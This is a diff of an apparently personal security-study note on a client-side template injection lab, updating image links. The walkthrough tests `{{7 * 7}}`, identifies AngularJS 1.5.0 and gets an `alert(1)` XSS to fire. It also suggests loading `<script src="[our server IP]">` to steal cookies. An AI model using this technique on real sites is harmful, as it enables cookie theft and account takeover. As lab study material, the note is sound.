@@ -13,34 +13,34 @@ Once an attacker has injected malicious code into the client-side template, they
 To prevent CSTI attacks, web application developers must properly validate and filter user input and use secure templating tools and frameworks that implement security measures to prevent malicious code injection.
 
 #### Lab  
-![[Pasted image 20260126191044.png]]  
-![[Pasted image 20260126191117.png]]  
+![Pasted image 20260126191044](/VaultSite/wiki-images/Pasted%20image%2020260126191044.png)  
+![Pasted image 20260126191117](/VaultSite/wiki-images/Pasted%20image%2020260126191117.png)  
 
 We see that if we enter something in the "fill me in plz" field, it is reflected on the web page afterward.  
-![[Pasted image 20260126191229.png]]  
+![Pasted image 20260126191229](/VaultSite/wiki-images/Pasted%20image%2020260126191229.png)  
 Let's try the same approach as with SSTI—we'll test if it evaluates `{{7 * 7}}`.  
-![[Pasted image 20260126191415.png]]  
-![[Pasted image 20260126191405.png]]  
+![Pasted image 20260126191415](/VaultSite/wiki-images/Pasted%20image%2020260126191415.png)  
+![Pasted image 20260126191405](/VaultSite/wiki-images/Pasted%20image%2020260126191405.png)  
 At this point, we can see that it closely resembles SSTI. However, if we attempt to load internal machine files or execute commands as in SSTI, we'll find that it doesn't work.  
 
 If we go to https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html or https://github.com/swisskyrepo/PayloadsAllTheThings and search for CSTI, we find different types of payloads.  
 
 Let's see what's being used in the background. We press Ctrl+U.  
-![[Pasted image 20260126191735.png]]  
+![Pasted image 20260126191735](/VaultSite/wiki-images/Pasted%20image%2020260126191735.png)  
 We see that it uses AngularJS 1.5.0, so we'll search for CSTI payloads for this version of AngularJS.  
 
 On GitHub, we find various payloads, all of which have one thing in common: `alert(1)`, which pops up a window if the payload executes successfully.  
 
 Let's try this one:  
-![[Pasted image 20260126192123.png]]  
-![[Pasted image 20260126192140.png]]  
+![Pasted image 20260126192123](/VaultSite/wiki-images/Pasted%20image%2020260126192123.png)  
+![Pasted image 20260126192140](/VaultSite/wiki-images/Pasted%20image%2020260126192140.png)  
 Nothing happened.  
 Let's try the one above it:  
-![[Pasted image 20260126192209.png]]  
+![Pasted image 20260126192209](/VaultSite/wiki-images/Pasted%20image%2020260126192209.png)  
 Now we see that, through CSTI, the XSS is executed.  
-![[Pasted image 20260126192236.png]]  
+![Pasted image 20260126192236](/VaultSite/wiki-images/Pasted%20image%2020260126192236.png)  
 What could we do with this? We could modify the payload—replace `alert(1)` with, for example, `<script src="[our server IP]">` to load a script and escalate this to stealing user cookies, gaining unauthorized access, or performing actions on behalf of another user.  
 
 For example, we made the pop-up display "pwned":  
-![[Pasted image 20260126193329.png]]  
-![[Pasted image 20260126193340.png]]
+![Pasted image 20260126193329](/VaultSite/wiki-images/Pasted%20image%2020260126193329.png)  
+![Pasted image 20260126193340](/VaultSite/wiki-images/Pasted%20image%2020260126193340.png)
